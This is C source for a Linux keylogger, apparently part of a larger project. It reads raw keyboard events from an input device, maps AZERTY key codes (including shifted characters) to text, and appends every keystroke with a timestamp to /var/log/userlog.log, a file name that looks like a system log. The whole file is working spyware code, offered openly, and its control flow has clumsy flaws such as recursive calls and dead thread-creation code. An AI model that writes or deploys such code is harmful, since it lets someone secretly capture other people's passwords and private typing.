#include <stdio.h>
#include <stdlib.h>
#include <string.h>  // strlen()
#include <unistd.h>  // read()
#include <time.h>  // date
#include <linux/input-event-codes.h> // for ev.code
#include <linux/input.h>  // struct input_event

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>  //open()

#include <pthread.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../../includes/keylogger/log_keys.h"
#include "../../includes/keylogger/keylogger_utils.h"

//static FILE *file_log = NULL;

//GtkWidget *text_view;

/*  file_log all keyboard keys exept when shift left or right is used.
    Add the date and hours of all keyboard event in the file_log file */
void *keylogger(char *deviceFile)
{
    /* Vars for keylogger */
    int bytesRead = 0;
    int fd = 0;

    char buffer[108] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event ev;

    FILE *file_log = NULL;

    pthread_t thread_Rshift_key = 0;

    strftime(buffer, 108, "%A %F %T", tm);

    file_log = fopen("/var/log/userlog.log", "a+");

    if(file_log == NULL)
        error("fopen()\nFonction : keylogger()");

    printf("deviceFile : %s\n\n", deviceFile);
    
/*
 write the date of the event
*/  fputs("\n\n", file_log);
    fputs(buffer, file_log);
    fputs("\n\n", file_log);

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device() 1");

    setbuf(file_log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(ev.type == EV_KEY && ev.value == 1 && ev.code == 54)
            Rshift_used_sustained(deviceFile);

        else if(ev.type == EV_KEY && ev.value == 1 && ev.code == 42)
            Lshift_used_sustained(deviceFile);

        else if(ev.type == EV_KEY && ev.value == 1)
        {
            switch(ev.code)
            {
                case 1 : fputs("[Echap] ", file_log);  break;
                case 2 : fputs("& ", file_log);   break;
                case 3 : fputs("é ", file_log);   break;
                case 4 : fputs("\" ", file_log);   break;
                case 5 : fputs("' ", file_log);   break;
                case 6 : fputs("( ", file_log);   break;
                case 7 : fputs("- ", file_log);   break;
                case 8 : fputs("è ", file_log);   break;
                case 9 : fputs("_ ", file_log);   break;
                case 10 : fputs("ç ", file_log);   break;
                case 11 : fputs("à ", file_log);   break;
                case 12 : fputs(") ", file_log);   break;
                case 13 : fputs("= ", file_log);   break;
                case 14 : fputs("[BackSpace] ", file_log);   break;
                case 15 : fputs("Tab ", file_log);   break;
                case 16 : fputs("a ", file_log);   break;
                case 17 : fputs("z ", file_log);   break;
                case 18 : fputs("e ", file_log);   break;
                case 19 : fputs("r ", file_log);   break;
                case 20 : fputs("t ", file_log);   break;
                case 21 : fputs("y ", file_log);   break;
                case 22 : fputs("u ", file_log);   break;
                case 23 : fputs("i ", file_log);   break;
                case 24 : fputs("o ", file_log);   break;
                case 25 : fputs("p ", file_log);   break;
                case 26 : fputs("^ ", file_log);   break;
                case 27 : fputs("$ ", file_log);   break;
                case 28 : fputs("[Enter]\n", file_log);   break;
                case 29 : fputs("[LCtrl] ", file_log);   break;
                case 30 : fputs("q ", file_log);   break;
                case 31 : fputs("s ", file_log);   break;
                case 32 : fputs("d ", file_log);   break;
                case 33 : fputs("f ", file_log);   break;
                case 34 : fputs("g ", file_log);   break;
                case 35 : fputs("h ", file_log);   break;
                case 36 : fputs("j ", file_log);   break;
                case 37 : fputs("k ", file_log);   break;
                case 38 : fputs("l ", file_log);   break;
                case 39 : fputs("m ", file_log);   break;
                case 40 : fputs("ù ", file_log);   break;
                case 41 : fputs("² ", file_log);   break;

                case 42 : Lshift_used(deviceFile); break;

                case 43 : fputs("* ", file_log);   break;
                case 44 : fputs("w ", file_log);   break;
                case 45 : fputs("x ", file_log);   break;
                case 46 : fputs("c ", file_log);   break;
                case 47 : fputs("v ", file_log);   break;
                case 48 : fputs("b ", file_log);   break;
                case 49 : fputs("n ", file_log);   break;
                case 50 : fputs(", ", file_log);   break;
                case 51 : fputs("; ", file_log);   break;
                case 52 : fputs(": ", file_log);   break;
                case 53 : fputs("! ", file_log);   break;

                case 54 : Rshift_used(deviceFile); break;

                case 55 : fputs("[Pav num.] * ", file_log);   break;
                case 56 : fputs("[LAlt] ", file_log);   break;
                case 57 : fputs("[Space] ", file_log); break;
                case 58 : fputs("[Capslock] ", file_log);   break;
                case 59 : fputs("F1 ", file_log);   break;
                case 60 : fputs("F2 ", file_log);   break;
                case 61 : fputs("F3 ", file_log);   break;
                case 62 : fputs("F4 ", file_log);   break;
                case 63 : fputs("F5 ", file_log);   break;
                case 64 : fputs("F6 ", file_log);   break;
                case 65 : fputs("F7 ", file_log);   break;
                case 66 : fputs("F8 ", file_log);   break;
                case 67 : fputs("F9 ", file_log);   break;
                case 68 : fputs("F10 ", file_log);   break;
                case 69: fputs("[Num lock] ", file_log);   break;
                case 70 : fputs("[Scroll Lock] ", file_log);   break;
                case 71 : fputs("[Pav num.] 7 ", file_log);   break;
                case 72 : fputs("[Pav num.] 8 ", file_log);   break;
                case 73 : fputs("[Pav num.] 9 ", file_log);   break;
                case 74 : fputs("[Pav num.] - ", file_log);   break;
                case 75 : fputs("[Pav num.] 4 ", file_log);   break;
                case 76 : fputs("[Pav num.] 5 ", file_log);   break;
                case 77 : fputs("[Pav num.] 6 ", file_log);   break;
                case 78 : fputs("[Pav num.] + ", file_log);   break;
                case 79 : fputs("[Pav num.] 1 ", file_log);   break;
                case 80 : fputs("[Pav num.] 2 ", file_log);   break;
                case 81 : fputs("[Pav num.] 3 ", file_log);   break;
                case 82 : fputs("[Pav num.] 0 ", file_log);   break;
                case 83 : fputs("[Pav num.] . ", file_log);   break;
                case 84 : fputs("[Unknown Key] ", file_log);   break;
                case 85 : fputs("[Unknown Key] ", file_log);   break;
                case 86 : fputs("< ", file_log);   break;
                case 87 : fputs("F11 ", file_log);   break;
                case 88 : fputs("\nF12 : ", file_log);  fputs(" Quitting...\n\n", file_log); fclose(file_log); pthread_exit(NULL);  /*F12 for getting out properly of the loop **/

                case 96 : fputs("[Pav num.] Enter ", file_log);   break;
                case 97 : fputs("[RCtrl] ", file_log);   break;
                case 98 : fputs("[Pav num.] / ", file_log);   break;

                case 100 : fputs("[AltGr] ", file_log);   break;

                case 103 : fputs("[UPARROW] ", file_log);   break;
                //case 104 : fputs(": ", file_log);   break;

                case 105 : fputs("[LEFTARROW] ", file_log);   break;
                case 106 : fputs("[RIGHTARROW] ", file_log);   break;
                //case 107 : fputs(": ", file_log);   break;
                case 108 : fputs("[DOWNARROW] ", file_log);   break;
                //case 109 : fputs(": ", file_log);   break;
                //case 110 : fputs(": ", file_log);   break;

                default : break;
            }
        }
    }

    fclose(file_log);

    pthread_exit(NULL);

    if(pthread_create(&thread_Rshift_key, NULL, (void*)Rshift_used, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");

}
/*  file_log right shift + key and and write the key in the file_log file.
 *  Then the function give back the hand to the main keylogger function
 */

void *Rshift_used(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[108] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event Rshift_ev;

    FILE *file_log = NULL;

    pthread_t thread_Lshift_key = 0;

    strftime(buffer, 108, "%A %F %T", tm);

    file_log = fopen("/var/log/userlog.log", "a+");

    if(file_log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device() 2");

    setbuf(file_log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &Rshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(Rshift_ev.type == EV_KEY && Rshift_ev.value == 1)
        {
            switch(Rshift_ev.code)
            {
                case 2 : fputs("1 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 3 : fputs("2 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 4 : fputs("3 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 5 : fputs("4 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 6 : fputs("5 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 7 : fputs("6 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 8 : fputs("7 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 9 : fputs("8 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 10 : fputs("9 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 11 : fputs("0 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 16 : fputs("A ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 17 : fputs("Z ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 18 : fputs("E ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 19 : fputs("R ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 20 : fputs("T ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 21 : fputs("Y ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 22 : fputs("U ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 23 : fputs("I ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 24 : fputs("O ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 25 : fputs("P ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 26 : fputs("¨ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 27 : fputs("£ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 30 : fputs("Q ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 31 : fputs("S ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 32 : fputs("D ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 33 : fputs("F ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 34 : fputs("G ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 35 : fputs("H ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 36 : fputs("J ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 37 : fputs("K ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 38 : fputs("L ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 39 : fputs("M ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 40 : fputs("% ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 43 : fputs("µ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 44 : fputs("W ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 45 : fputs("X ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 46 : fputs("C ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 47 : fputs("V ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 48 : fputs("B ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 49 : fputs("N ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 50 : fputs("? ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 51 : fputs(". ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 52 : fputs("/ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 53 : fputs("§ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 86 : fputs("> ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                default : break;
            }
        }
    }

    pthread_exit(NULL);

    if(pthread_create(&thread_Lshift_key, NULL, (void*)Lshift_used, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}

/*  file_log left shift + key and and write the key in the file_log file.
 *  Then the function give back the hand to the main keylfile_logger function.
 */

void *Lshift_used(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[108] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event Lshift_ev;

    FILE *file_log = NULL;

    pthread_t thread_Rshift_key_sustain = 0;

    strftime(buffer, 108, "%A %F %T", tm);

    file_log = fopen("/var/log/userlog.log", "a+");

    if(file_log == NULL)
        error("fopen()\nFonction : keylogger() 3");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(file_log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &Lshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(Lshift_ev.type == EV_KEY && Lshift_ev.value == 1)
        {

            switch(Lshift_ev.code)
            {
                case 2 : fputs("1 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 3 : fputs("2 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 4 : fputs("3 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 5 : fputs("4 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 6 : fputs("5 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 7 : fputs("6 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 8 : fputs("7 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 9 : fputs("8 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 10 : fputs("9 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 11 : fputs("0 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 16 : fputs("A ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 17 : fputs("Z ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 18 : fputs("E ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 19 : fputs("R ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 20 : fputs("T ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 21 : fputs("Y ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 22 : fputs("U ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 23 : fputs("I ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 24 : fputs("O ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 25 : fputs("P ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 26 : fputs("¨ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 27 : fputs("£ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 30 : fputs("Q ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 31 : fputs("S ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 32 : fputs("D ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 33 : fputs("F ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 34 : fputs("G ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 35 : fputs("H ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 36 : fputs("J ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 37 : fputs("K ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 38 : fputs("L ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 39 : fputs("M ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 40 : fputs("% ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 43 : fputs("µ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 44 : fputs("W ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 45 : fputs("X ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 46 : fputs("C ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 47 : fputs("V ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 48 : fputs("B ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 49 : fputs("N ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 50 : fputs("? ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 51 : fputs(". ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 52 : fputs("/ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 53 : fputs("§ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                case 86 : fputs("> ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
                default : break;
            }
        }
    }

    pthread_exit(NULL);

    if(pthread_create(&thread_Rshift_key_sustain, NULL, (void*)Rshift_used_sustained, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}

/*  Same stuff with the only difference that right shift is sustained */

void *Rshift_used_sustained(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[108] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event sustain_Rshift_ev;

    FILE *file_log = NULL;

    pthread_t thread_Lshift_key_sustain = 0;

    strftime(buffer, 108, "%A %F %T", tm);

    file_log = fopen("/var/log/userlog.log", "a+");

    if(file_log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device() 4");

    setbuf(file_log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &sustain_Rshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(sustain_Rshift_ev.code == 54 && sustain_Rshift_ev.value == 0)
            keylogger(deviceFile);

        if(sustain_Rshift_ev.type == EV_KEY && sustain_Rshift_ev.value == 0)
        {
            switch(sustain_Rshift_ev.code)
            {
                case 2 : fputs("1 ", file_log);   break;
                case 3 : fputs("2 ", file_log);   break;
                case 4 : fputs("3 ", file_log);   break;
                case 5 : fputs("4 ", file_log);   break;
                case 6 : fputs("5 ", file_log);   break;
                case 7 : fputs("6 ", file_log);   break;
                case 8 : fputs("7 ", file_log);   break;
                case 9 : fputs("8 ", file_log);   break;
                case 10 : fputs("9 ", file_log);   break;
                case 11 : fputs("0 ", file_log);   break;
                case 16 : fputs("A ", file_log);   break;
                case 17 : fputs("Z ", file_log);   break;
                case 18 : fputs("E ", file_log);   break;
                case 19 : fputs("R ", file_log);   break;
                case 20 : fputs("T ", file_log);   break;
                case 21 : fputs("Y ", file_log);   break;
                case 22 : fputs("U ", file_log);   break;
                case 23 : fputs("I ", file_log);   break;
                case 24 : fputs("O ", file_log);   break;
                case 25 : fputs("P ", file_log);   break;
                case 26 : fputs("¨ ", file_log);   break;
                case 27 : fputs("£ ", file_log);   break;
                case 30 : fputs("Q ", file_log);   break;
                case 31 : fputs("S ", file_log);   break;
                case 32 : fputs("D ", file_log);   break;
                case 33 : fputs("F ", file_log);   break;
                case 34 : fputs("G ", file_log);   break;
                case 35 : fputs("H ", file_log);   break;
                case 36 : fputs("J ", file_log);   break;
                case 37 : fputs("K ", file_log);   break;
                case 38 : fputs("L ", file_log);   break;
                case 39 : fputs("M ", file_log);   break;
                case 40 : fputs("% ", file_log);   break;
                case 43 : fputs("µ ", file_log);   break;
                case 44 : fputs("W ", file_log);   break;
                case 45 : fputs("X ", file_log);   break;
                case 46 : fputs("C ", file_log);   break;
                case 47 : fputs("V ", file_log);   break;
                case 48 : fputs("B ", file_log);   break;
                case 49 : fputs("N ", file_log);   break;
                case 50 : fputs("? ", file_log);   break;
                case 51 : fputs(". ", file_log);   break;
                case 52 : fputs("/ ", file_log);   break;
                case 53 : fputs("§ ", file_log);   break;
                case 86 : fputs("> ", file_log);   break;

                case 88 : fputs("\nF12 : ", file_log);  fputs(" Quitting...\n\n", file_log); fclose(file_log); pthread_exit(NULL);  /*F12 for getting out properly of the loop */

                default : break;
            }
        }
    }

    pthread_exit(NULL);

    if(pthread_create(&thread_Lshift_key_sustain, NULL, (void*)Lshift_used_sustained, deviceFile) == -1)
        error("pthread_create()\nFonction : *keylogger()");
}

/*  Same with left shift sustained */
void *Lshift_used_sustained(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event sustain_Lshift_ev;

    FILE *file_log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    file_log = fopen("/var/log/userlog.log", "a+");

    if(file_log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device() 5");

    setbuf(file_log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &sustain_Lshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(sustain_Lshift_ev.code == 42 && sustain_Lshift_ev.value == 0)
            keylogger(deviceFile);

        if(sustain_Lshift_ev.type == EV_KEY && sustain_Lshift_ev.value == 0)
        {
            switch(sustain_Lshift_ev.code)
            {
                case 2 : fputs("1 ", file_log);   break;
                case 3 : fputs("2 ", file_log);   break;
                case 4 : fputs("3 ", file_log);   break;
                case 5 : fputs("4 ", file_log);   break;
                case 6 : fputs("5 ", file_log);   break;
                case 7 : fputs("6 ", file_log);   break;
                case 8 : fputs("7 ", file_log);   break;
                case 9 : fputs("8 ", file_log);   break;
                case 10 : fputs("9 ", file_log);   break;
                case 11 : fputs("0 ", file_log);   break;
                case 16 : fputs("A ", file_log);   break;
                case 17 : fputs("Z ", file_log);   break;
                case 18 : fputs("E ", file_log);   break;
                case 19 : fputs("R ", file_log);   break;
                case 20 : fputs("T ", file_log);   break;
                case 21 : fputs("Y ", file_log);   break;
                case 22 : fputs("U ", file_log);   break;
                case 23 : fputs("I ", file_log);   break;
                case 24 : fputs("O ", file_log);   break;
                case 25 : fputs("P ", file_log);   break;
                case 26 : fputs("¨ ", file_log);   break;
                case 27 : fputs("£ ", file_log);   break;
                case 30 : fputs("Q ", file_log);   break;
                case 31 : fputs("S ", file_log);   break;
                case 32 : fputs("D ", file_log);   break;
                case 33 : fputs("F ", file_log);   break;
                case 34 : fputs("G ", file_log);   break;
                case 35 : fputs("H ", file_log);   break;
                case 36 : fputs("J ", file_log);   break;
                case 37 : fputs("K ", file_log);   break;
                case 38 : fputs("L ", file_log);   break;
                case 39 : fputs("M ", file_log);   break;
                case 40 : fputs("% ", file_log);   break;
                case 43 : fputs("µ ", file_log);   break;
                case 44 : fputs("W ", file_log);   break;
                case 45 : fputs("X ", file_log);   break;
                case 46 : fputs("C ", file_log);   break;
                case 47 : fputs("V ", file_log);   break;
                case 48 : fputs("B ", file_log);   break;
                case 49 : fputs("N ", file_log);   break;
                case 50 : fputs("? ", file_log);   break;
                case 51 : fputs(". ", file_log);   break;
                case 52 : fputs("/ ", file_log);   break;
                case 53 : fputs("§ ", file_log);   break;
                case 86 : fputs("> ", file_log);   break;

                case 88 : fputs("\nF12 : ", file_log);  fputs(" Quitting...\n\n", file_log); fclose(file_log); pthread_exit(NULL);  /*F12 for getting out properly of the loop */

                default : break;
            }
        }
    }

    pthread_exit(NULL);
}


